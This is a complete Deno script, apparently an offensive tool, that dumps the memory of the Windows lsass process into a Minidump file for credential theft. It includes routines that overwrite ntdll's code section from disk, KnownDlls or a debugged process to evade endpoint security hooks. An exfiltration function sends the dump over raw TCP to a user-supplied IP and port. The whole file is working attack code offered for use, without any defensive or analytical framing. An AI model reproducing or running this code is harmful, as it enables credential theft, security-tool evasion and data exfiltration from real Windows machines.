#!/usr/bin/env -S deno run --allow-ffi --allow-write --allow-net
// nativedump.js — Dump lsass and generate a Minidump file (Deno, zero deps)
// Usage: deno run --allow-ffi --allow-write --allow-net nativedump.js [-o disk|knowndlls|debugproc] [-k path] [-f output] [-i ip] [-p port]

// ═══════════════════════════════════════
// Constants
// ═══════════════════════════════════════
const TOKEN_ADJUST_PRIVILEGES = 0x0020;
const TOKEN_QUERY = 0x0008;
const SE_PRIVILEGE_ENABLED = 0x00000002;
const PROCESS_VM_OPERATION = 0x8;
const PROCESS_VM_WRITE = 0x20;
const PAGE_NOACCESS = 0x01;
const MEM_COMMIT = 0x00001000;
const MAXIMUM_ALLOWED = 0x02000000;
const GENERIC_READ = 0x80000000;
const FILE_SHARE_READ = 0x00000001;
const FILE_ATTRIBUTE_NORMAL = 0x00000080;
const OPEN_EXISTING = 3;
const PAGE_READONLY = 0x02;
const SEC_IMAGE_NO_EXECUTE = 0x11000000;
const FILE_MAP_READ = 4;
const SECTION_MAP_READ = 0x0004;
const PAGE_EXECUTE_WRITECOPY = 0x80;
const DEBUG_PROCESS = 0x00000001;
const OFFSET_MAPPEDDLL = 4096;

const SZ_OSVERSIONINFOEXW = 284;
const SZ_PBI = 48;
const SZ_MBI = 48;
const SZ_OA = 48;
const SZ_CID = 16;
const SZ_TP = 16;
const SZ_SI = 104;
const SZ_PI = 24;

// ══════════════════════════════
// FFI — ntdll.dll
// ══════════════════════════════
const ntdll = Deno.dlopen("ntdll.dll", {
  RtlGetVersion: { parameters: ["buffer"], result: "u32" },
  NtOpenProcessToken: { parameters: ["pointer", "u32", "buffer"], result: "u32" },
  NtAdjustPrivilegesToken: { parameters: ["pointer", "u32", "buffer", "u32", "pointer", "pointer"], result: "u32" },
  NtOpenProcess: { parameters: ["buffer", "u32", "buffer", "buffer"], result: "i32" },
  NtClose: { parameters: ["pointer"], result: "u32" },
  NtGetNextProcess: { parameters: ["pointer", "u32", "u32", "u32", "buffer"], result: "u32" },
  NtQueryInformationProcess: { parameters: ["pointer", "u32", "buffer", "u32", "buffer"], result: "i32" },
  NtReadVirtualMemory: { parameters: ["pointer", "pointer", "buffer", "u32", "buffer"], result: "i32" },
  NtQueryVirtualMemory: { parameters: ["pointer", "pointer", "u32", "buffer", "u32", "buffer"], result: "u32" },
  NtOpenSection: { parameters: ["buffer", "u32", "buffer"], result: "i32" },
  RtlMoveMemory: { parameters: ["pointer", "pointer", "usize"], result: "void" },
});

// ═══════════════════════════════════════
// FFI — kernel32.dll
// ═══════════════════════════════════════
const kernel32 = Deno.dlopen("kernel32.dll", {
  GetCurrentProcess: { parameters: [], result: "pointer" },
  CreateFileA: { parameters: ["buffer", "u32", "u32", "pointer", "u32", "u32", "pointer"], result: "pointer" },
  CreateFileMappingA: { parameters: ["pointer", "pointer", "u32", "u32", "u32", "pointer"], result: "pointer" },
  MapViewOfFile: { parameters: ["pointer", "u32", "u32", "u32", "usize"], result: "pointer" },
  VirtualProtect: { parameters: ["pointer", "u32", "u32", "buffer"], result: "i32" },
  CloseHandle: { parameters: ["pointer"], result: "i32" },
  CreateProcessW: { parameters: ["buffer", "pointer", "pointer", "pointer", "i32", "u32", "pointer", "pointer", "buffer", "buffer"], result: "i32" },
  DebugActiveProcessStop: { parameters: ["u32"], result: "i32" },
  TerminateProcess: { parameters: ["pointer", "u32"], result: "i32" },
});

// ═══════════════════════════════════════
// FFI — ws2_32.dll (for remote exfiltration)
// ═══════════════════════════════════════
const ws2 = Deno.dlopen("ws2_32.dll", {
  WSAStartup: { parameters: ["u16", "buffer"], result: "i32" },
  socket: { parameters: ["i32", "i32", "i32"], result: "usize" },
  connect: { parameters: ["usize", "buffer", "i32"], result: "i32" },
  send: { parameters: ["usize", "buffer", "i32", "i32"], result: "i32" },
  closesocket: { parameters: ["usize"], result: "i32" },
  WSACleanup: { parameters: [], result: "i32" },
});

// ═══════════════════════════════════════
// Buffer / pointer helpers
// ═══════════════════════════════════════
function getU32(buf, off = 0) { return new DataView(buf.buffer, buf.byteOffset).getUint32(off, true); }
function getU64(buf, off = 0) { return new DataView(buf.buffer, buf.byteOffset).getBigUint64(off, true); }
function putU16(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setUint16(off, val, true); }
function putU32(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setUint32(off, val, true); }
function putU64(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setBigUint64(off, val, true); }
function toPtr(v) { const b = BigInt(v); return b === 0n ? null : Deno.UnsafePointer.create(b); }
function ptrOf(buf, off = 0) { const v = getU64(buf, off); return v === 0n ? null : Deno.UnsafePointer.create(v); }
function ptrVal(ptr) { if (ptr === null) return 0n; if (typeof ptr === "bigint") return ptr; return Deno.UnsafePointer.value(ptr); }
function encodeAnsi(str) { const buf = new Uint8Array(str.length + 1); for (let i = 0; i < str.length; i++) buf[i] = str.charCodeAt(i); return buf; }
function encodeWide(str) { const buf = new Uint8Array((str.length + 1) * 2); for (let i = 0; i < str.length; i++) { buf[i * 2] = str.charCodeAt(i) & 0xff; buf[i * 2 + 1] = (str.charCodeAt(i) >> 8) & 0xff; } return buf; }

// ══════════════════════════════
// NT API wrappers
// ══════════════════════════════
function readRemoteIntPtr(hProc, addr) {
  const buf = new Uint8Array(8);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, 8, br);
  if (st !== 0) return null;
  return getU64(buf);
}

function readRemoteN(hProc, addr, n) {
  const buf = new Uint8Array(n);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, n, br);
  if (st !== 0) return null;
  if (n === 8) return getU64(buf);
  if (n === 4) return BigInt(getU32(buf));
  if (n === 2) return BigInt(new DataView(buf.buffer).getUint16(0, true));
  return BigInt(buf[0]);
}

function readRemoteWStr(hProc, addr) {
  const buf = new Uint8Array(256);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, 256, br);
  if (st !== 0) return "";
  const cnt = getU32(br);
  let end = cnt;
  for (let i = 0; i < cnt - 1; i += 2) { if (buf[i] === 0 && buf[i + 1] === 0) { end = i; break; } }
  return new TextDecoder("utf-16le").decode(buf.subarray(0, end));
}

// ═══════════════════════════════════════
// Process helpers
// ═══════════════════════════════════════
function getProcNameFromHandle(hProc) {
  const pbi = new Uint8Array(SZ_PBI);
  const rl = new Uint8Array(4);
  const st = ntdll.symbols.NtQueryInformationProcess(hProc, 0, pbi, SZ_PBI, rl);
  if (st !== 0) throw new Error("NtQueryInformationProcess: 0x" + (st >>> 0).toString(16));
  const peb = getU64(pbi, 8);
  const ppAddr = readRemoteIntPtr(hProc, peb + 0x20n);
  if (ppAddr === null) return "";
  const imgAddr = readRemoteIntPtr(hProc, ppAddr + 0x68n);
  if (imgAddr === null) return "";
  return readRemoteWStr(hProc, imgAddr);
}

function getProcessByName(name) {
  const hBuf = new Uint8Array(8);
  while (true) {
    const cur = ptrOf(hBuf);
    const st = ntdll.symbols.NtGetNextProcess(cur, MAXIMUM_ALLOWED, 0, 0, hBuf);
    if (st !== 0) break;
    try {
      const h = ptrOf(hBuf);
      const n = getProcNameFromHandle(h);
      if (n.toLowerCase() === name.toLowerCase()) return h;
    } catch { /* skip */ }
  }
  return null;
}

function openProcess(pid) {
  const hBuf = new Uint8Array(8);
  const oa = new Uint8Array(SZ_OA); putU32(oa, 0, SZ_OA);
  const cid = new Uint8Array(SZ_CID); putU64(cid, 0, BigInt(pid));
  const st = ntdll.symbols.NtOpenProcess(hBuf, PROCESS_VM_OPERATION | PROCESS_VM_WRITE, oa, cid);
  if (st !== 0) { console.log("[-] NtOpenProcess failed. Are you admin?"); Deno.exit(1); }
  return ptrOf(hBuf);
}

function enableDebugPrivilege() {
  const curProc = openProcess(Deno.pid);
  const tokBuf = new Uint8Array(8);
  let st = ntdll.symbols.NtOpenProcessToken(curProc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, tokBuf);
  if (st !== 0) { console.log("[-] NtOpenProcessToken: 0x" + (st >>> 0).toString(16)); Deno.exit(1); }
  const tok = ptrOf(tokBuf);
  const tp = new Uint8Array(SZ_TP);
  putU32(tp, 0, 1); putU32(tp, 4, 20); putU32(tp, 8, 0); putU32(tp, 12, SE_PRIVILEGE_ENABLED);
  st = ntdll.symbols.NtAdjustPrivilegesToken(tok, 0, tp, SZ_TP, null, null);
  ntdll.symbols.NtClose(tok);
  if (st !== 0) { console.log("[-] NtAdjustPrivilegesToken: 0x" + (st >>> 0).toString(16)); Deno.exit(1); }
  console.log("[+] SeDebugPrivilege enabled successfully.");
}

// ═══════════════════════════════════════
// OS version (RtlGetVersion)
// ═══════════════════════════════════════
function getOsVersion() {
  const buf = new Uint8Array(SZ_OSVERSIONINFOEXW);
  putU32(buf, 0, SZ_OSVERSIONINFOEXW);
  const st = ntdll.symbols.RtlGetVersion(buf);
  if (st !== 0) { console.log("[-] RtlGetVersion failed"); Deno.exit(1); }
  return {
    majorVersion: getU32(buf, 4),
    minorVersion: getU32(buf, 8),
    buildNumber: getU32(buf, 12),
  };
}

// ═══════════════════════════════════════
// Module enumeration (PEB walk)
// ═══════════════════════════════════════
function getModulesInfo(hProc) {
  const pbi = new Uint8Array(SZ_PBI);
  const rl = new Uint8Array(4);
  const st = ntdll.symbols.NtQueryInformationProcess(hProc, 0, pbi, SZ_PBI, rl);
  if (st !== 0) { console.log("[-] NtQueryInformationProcess failed"); Deno.exit(1); }

  const peb = getU64(pbi, 8);
  console.log("[+] PEB Base Address: \t0x" + peb.toString(16));
  const ldrAddr = readRemoteIntPtr(hProc, peb + 0x18n);
  let nextFlink = readRemoteIntPtr(hProc, ldrAddr + 0x30n);

  const mods = [];
  let dllBase = 1337n;
  while (dllBase !== 0n) {
    nextFlink -= 0x10n;
    dllBase = readRemoteN(hProc, nextFlink + 0x20n, 8);
    if (dllBase === null || dllBase === 0n) break;
    const bufPtr = readRemoteIntPtr(hProc, nextFlink + 0x50n);
    const baseName = bufPtr !== null ? readRemoteWStr(hProc, bufPtr) : "";
    const fullPtr = readRemoteIntPtr(hProc, nextFlink + 0x40n);
    const fullPath = fullPtr !== null ? readRemoteWStr(hProc, fullPtr) : "";
    mods.push({ BaseName: baseName, FullDllName: fullPath, BaseAddress: "0x" + dllBase.toString(16), RegionSize: 0 });
    nextFlink = readRemoteIntPtr(hProc, nextFlink + 0x10n);
  }
  return mods;
}

// ═══════════════════════════════════════
// Overwrite functions
// ═══════════════════════════════════════
function getLocalLibAddress(dllName) {
  const hProc = kernel32.symbols.GetCurrentProcess();
  const pbi = new Uint8Array(SZ_PBI);
  const rl = new Uint8Array(4);
  ntdll.symbols.NtQueryInformationProcess(hProc, 0, pbi, SZ_PBI, rl);
  const peb = getU64(pbi, 8);
  const ldrAddr = readRemoteN(hProc, peb + 0x18n, 8);
  let nextFlink = readRemoteN(hProc, ldrAddr + 0x30n, 8);
  let dllBase = 1337n;
  while (dllBase !== 0n) {
    nextFlink -= 0x10n;
    dllBase = readRemoteN(hProc, nextFlink + 0x20n, 8);
    if (dllBase === null || dllBase === 0n) break;
    const bufPtr = readRemoteN(hProc, nextFlink + 0x50n, 8);
    const baseName = bufPtr !== null ? readRemoteWStr(hProc, bufPtr) : "";
    if (baseName === dllName) return dllBase;
    nextFlink = readRemoteN(hProc, nextFlink + 0x10n, 8);
  }
  return null;
}

function getSectionInfo(localNtdll) {
  const hProc = kernel32.symbols.GetCurrentProcess();
  const eLfanew = readRemoteN(hProc, localNtdll + 0x3Cn, 4);
  const sizeOfCode = readRemoteN(hProc, localNtdll + eLfanew + 28n, 4);
  const baseOfCode = readRemoteN(hProc, localNtdll + eLfanew + 44n, 4);
  return [baseOfCode, sizeOfCode];
}

function replaceNtdllSection(srcPtr, targetAddr, size) {
  const oldProt = new Uint8Array(4);
  kernel32.symbols.VirtualProtect(toPtr(targetAddr), Number(size), PAGE_EXECUTE_WRITECOPY, oldProt);
  ntdll.symbols.RtlMoveMemory(toPtr(targetAddr), srcPtr, Number(size));
  const prev = getU32(oldProt);
  kernel32.symbols.VirtualProtect(toPtr(targetAddr), Number(size), prev, oldProt);
}

function overwriteDisk(path) {
  const fh = kernel32.symbols.CreateFileA(encodeAnsi(path), GENERIC_READ, FILE_SHARE_READ, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
  const mh = kernel32.symbols.CreateFileMappingA(fh, null, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, null);
  const unhookedNtdll = kernel32.symbols.MapViewOfFile(mh, FILE_MAP_READ, 0, 0, 0);
  kernel32.symbols.CloseHandle(fh); kernel32.symbols.CloseHandle(mh);
  const unhookedText = ptrVal(unhookedNtdll) + BigInt(OFFSET_MAPPEDDLL);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  console.log("[+] Copying " + sizeOfCode + " bytes from 0x" + unhookedText.toString(16) + " to 0x" + localTxt.toString(16));
  replaceNtdllSection(toPtr(unhookedText), localTxt, sizeOfCode);
}

function overwriteKnownDlls() {
  const sectionName = "\\KnownDlls\\ntdll.dll";
  const wideStr = encodeWide(sectionName);
  const us = new Uint8Array(16);
  putU16(us, 0, sectionName.length * 2); putU16(us, 2, sectionName.length * 2 + 2);
  putU64(us, 8, ptrVal(Deno.UnsafePointer.of(wideStr)));
  const oa = new Uint8Array(SZ_OA); putU32(oa, 0, SZ_OA);
  putU64(oa, 16, ptrVal(Deno.UnsafePointer.of(us)));
  const shBuf = new Uint8Array(8);
  const st = ntdll.symbols.NtOpenSection(shBuf, SECTION_MAP_READ, oa);
  if (st !== 0) { console.log("[-] NtOpenSection: " + st); return; }
  const unhookedNtdll = kernel32.symbols.MapViewOfFile(ptrOf(shBuf), SECTION_MAP_READ, 0, 0, 0);
  kernel32.symbols.CloseHandle(ptrOf(shBuf));
  const unhookedText = ptrVal(unhookedNtdll) + BigInt(OFFSET_MAPPEDDLL);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  console.log("[+] Copying " + sizeOfCode + " bytes from 0x" + unhookedText.toString(16) + " to 0x" + localTxt.toString(16));
  replaceNtdllSection(toPtr(unhookedText), localTxt, sizeOfCode);
}

function overwriteDebugProc(path) {
  const si = new Uint8Array(SZ_SI); putU32(si, 0, SZ_SI);
  const pi = new Uint8Array(SZ_PI);
  const ok = kernel32.symbols.CreateProcessW(encodeWide(path), null, null, null, 0, DEBUG_PROCESS, null, null, si, pi);
  if (!ok) { console.log("[-] CreateProcessW failed"); return; }
  const hProcess = ptrOf(pi, 0); const dwPid = getU32(pi, 16);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  const buf = new Uint8Array(Number(sizeOfCode)); const br = new Uint8Array(8);
  ntdll.symbols.NtReadVirtualMemory(hProcess, toPtr(localTxt), buf, Number(sizeOfCode), br);
  kernel32.symbols.DebugActiveProcessStop(dwPid);
  kernel32.symbols.TerminateProcess(hProcess, 0);
  console.log("[+] Copying " + sizeOfCode + " bytes to 0x" + localTxt.toString(16));
  replaceNtdllSection(Deno.UnsafePointer.of(buf), localTxt, sizeOfCode);
}

// ═══════════════════════════════════════
// Minidump builder
// ═══════════════════════════════════════
function buildMinidump(osVer, moduleArr, mem64Arr, regionsDump) {
  const numModules = moduleArr.length;
  let moduleListSize = 4 + 108 * numModules;
  for (const m of moduleArr) moduleListSize += m.FullDllName.length * 2 + 8;

  const mem64ListOffset = moduleListSize + 0x7c;
  const mem64ListSize = 16 + 16 * mem64Arr.length;
  const offsetMemRegions = mem64ListOffset + mem64ListSize;

  console.log("[+] Total number of modules: \t" + numModules);
  console.log("[+] ModuleListStream size:   \t" + moduleListSize);
  console.log("[+] Mem64List offset: \t\t" + mem64ListOffset);
  console.log("[+] Mem64List size: \t\t" + mem64ListSize);

  const totalSize = offsetMemRegions + regionsDump.length;
  const dump = new Uint8Array(totalSize);
  const dv = new DataView(dump.buffer);
  let off = 0;

  // Header (32 bytes)
  dv.setUint32(off, 0x504d444d, true); off += 4;
  dv.setUint16(off, 0xa793, true); off += 2;
  dv.setUint16(off, 0, true); off += 2;
  dv.setUint32(off, 3, true); off += 4;
  dv.setUint32(off, 0x20, true); off += 4;
  off = 32;

  // Stream Directory (3 entries x 12 bytes)
  dv.setUint32(off, 4, true); off += 4;
  dv.setUint32(off, moduleListSize, true); off += 4;
  dv.setUint32(off, 0x7c, true); off += 4;
  dv.setUint32(off, 7, true); off += 4;
  dv.setUint32(off, 56, true); off += 4;
  dv.setUint32(off, 0x44, true); off += 4;
  dv.setUint32(off, 9, true); off += 4;
  dv.setUint32(off, mem64ListSize, true); off += 4;
  dv.setUint32(off, mem64ListOffset, true); off += 4;

  // SystemInfoStream (56 bytes at offset 0x44)
  off = 0x44;
  dv.setUint16(off, 9, true); off += 2;
  off += 6;
  dv.setUint32(off, osVer.majorVersion, true); off += 4;
  dv.setUint32(off, osVer.minorVersion, true); off += 4;
  dv.setUint32(off, osVer.buildNumber, true); off += 4;
  off = 0x44 + 56;

  // ModuleListStream (at offset 0x7c)
  off = 0x7c;
  dv.setUint32(off, numModules, true); off += 4;

  let ptrIndex = 0x7c + 4 + 108 * numModules;
  for (const m of moduleArr) {
    const baseAddr = BigInt(m.BaseAddress);
    dv.setBigUint64(off, baseAddr, true); off += 8;
    dv.setBigUint64(off, BigInt(m.RegionSize), true); off += 8;
    off += 4;
    dv.setBigUint64(off, BigInt(ptrIndex), true); off += 8;
    ptrIndex += m.FullDllName.length * 2 + 8;
    off += 108 - (8 + 8 + 4 + 8);
  }

  for (const m of moduleArr) {
    const fullPath = m.FullDllName;
    dv.setUint32(off, fullPath.length * 2, true); off += 4;
    for (let i = 0; i < fullPath.length; i++) {
      dv.setUint16(off, fullPath.charCodeAt(i), true); off += 2;
    }
    off += 4;
  }

  // Memory64ListStream
  off = mem64ListOffset;
  dv.setBigUint64(off, BigInt(mem64Arr.length), true); off += 8;
  dv.setBigUint64(off, BigInt(offsetMemRegions), true); off += 8;
  for (const entry of mem64Arr) {
    dv.setBigUint64(off, BigInt(entry.BaseAddress), true); off += 8;
    dv.setBigUint64(off, BigInt(entry.RegionSize), true); off += 8;
  }

  // Memory regions data
  dump.set(regionsDump, offsetMemRegions);

  return dump;
}

// ═══════════════════════════════════════
// Network exfiltration (raw TCP via ws2_32)
// ═══════════════════════════════════════
function exfiltrateFile(dumpBytes, ip, port) {
  const wsaData = new Uint8Array(408);
  ws2.symbols.WSAStartup(0x0202, wsaData);
  const sock = ws2.symbols.socket(2, 1, 6);
  const parts = ip.split(".").map(Number);
  const sa = new Uint8Array(16);
  sa[0] = 2;
  sa[2] = (port >> 8) & 0xff; sa[3] = port & 0xff;
  sa[4] = parts[0]; sa[5] = parts[1]; sa[6] = parts[2]; sa[7] = parts[3];
  const ret = ws2.symbols.connect(sock, sa, 16);
  if (ret !== 0) { console.log("[-] Connection failed"); ws2.symbols.WSACleanup(); return false; }
  const chunkSize = 65536;
  for (let i = 0; i < dumpBytes.length; i += chunkSize) {
    const chunk = dumpBytes.subarray(i, Math.min(i + chunkSize, dumpBytes.length));
    ws2.symbols.send(sock, chunk, chunk.length, 0);
  }
  ws2.symbols.closesocket(sock);
  ws2.symbols.WSACleanup();
  return true;
}

// ═══════════════════════════════════════
// CLI args
// ═══════════════════════════════════════
function parseArgs() {
  const args = { option: null, path: null, output: null, ip: null, port: null };
  for (let i = 0; i < Deno.args.length; i++) {
    if (Deno.args[i] === "-o" || Deno.args[i] === "--option") args.option = Deno.args[++i];
    else if (Deno.args[i] === "-k" || Deno.args[i] === "--path") args.path = Deno.args[++i];
    else if (Deno.args[i] === "-f" || Deno.args[i] === "--file") args.output = Deno.args[++i];
    else if (Deno.args[i] === "-i" || Deno.args[i] === "--ip") args.ip = Deno.args[++i];
    else if (Deno.args[i] === "-p" || Deno.args[i] === "--port") args.port = parseInt(Deno.args[++i]);
  }
  return args;
}

// ═══════════════════════════════════════
// Main
// ═══════════════════════════════════════
function main() {
  const args = parseArgs();

  if (args.option === "disk") {
    overwriteDisk(args.path || "C:\\Windows\\System32\\ntdll.dll");
  } else if (args.option === "knowndlls") {
    overwriteKnownDlls();
  } else if (args.option === "debugproc") {
    overwriteDebugProc(args.path || "c:\\windows\\system32\\calc.exe");
  }

  enableDebugPrivilege();

  const processName = "c:\\windows\\system32\\lsass.exe";
  const hProc = getProcessByName(processName);
  if (hProc === null) { console.log("[-] Could not get process handle"); Deno.exit(1); }
  console.log("[+] Process handle: \tobtained");

  const moduleArr = getModulesInfo(hProc);

  let memAddr = 0n;
  const maxAddr = 0x7FFFFFFeFFFFn;
  let auxSize = 0n, auxName = "";
  const mem64Arr = [];
  const regionChunks = [];
  let totalRegionSize = 0;

  while (memAddr < maxAddr) {
    const mbi = new Uint8Array(SZ_MBI);
    const rl = new Uint8Array(8);
    ntdll.symbols.NtQueryVirtualMemory(hProc, toPtr(memAddr), 0, mbi, SZ_MBI, rl);
    const protect = getU32(mbi, 36), state = getU32(mbi, 32);
    const regionSize = getU64(mbi, 24);

    if (protect !== PAGE_NOACCESS && state === MEM_COMMIT) {
      const cur = moduleArr.find((o) => o.BaseName === auxName) || { BaseAddress: "0" };
      if (regionSize === 0x1000n && memAddr !== BigInt(cur.BaseAddress)) {
        const idx = moduleArr.findIndex((o) => o.BaseName === auxName);
        if (idx !== -1) moduleArr[idx].RegionSize = Number(auxSize);
        for (const m of moduleArr) {
          if (memAddr === BigInt(m.BaseAddress)) { auxName = m.BaseName; auxSize = regionSize; break; }
        }
      } else {
        auxSize += regionSize;
      }

      const sz = Number(regionSize);
      const buf = new Uint8Array(sz);
      const br = new Uint8Array(8);
      const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(memAddr), buf, sz, br);
      if (st === 0) {
        regionChunks.push(buf);
        totalRegionSize += sz;
        mem64Arr.push({ BaseAddress: memAddr, RegionSize: sz });
      }
    }

    memAddr += regionSize > 0n ? regionSize : 0x1000n;
  }
  ntdll.symbols.NtClose(hProc);

  console.log("[+] Memory regions dumped: " + mem64Arr.length);

  const regionsDump = new Uint8Array(totalRegionSize);
  let pos = 0;
  for (const chunk of regionChunks) { regionsDump.set(chunk, pos); pos += chunk.length; }

  const osVer = getOsVersion();
  console.log("[+] OS Version: " + osVer.majorVersion + "." + osVer.minorVersion + " (Build " + osVer.buildNumber + ")");

  const dumpBytes = buildMinidump(osVer, moduleArr, mem64Arr, regionsDump);

  if (args.ip && args.port) {
    const ok = exfiltrateFile(dumpBytes, args.ip, args.port);
    if (ok) console.log("[+] File exfiltrated to " + args.ip + ":" + args.port);
  } else {
    const outFile = args.output || "proc_dump.dmp";
    Deno.writeFileSync(outFile, dumpBytes);
    console.log("[+] File " + outFile + " created.");
  }
}

main();
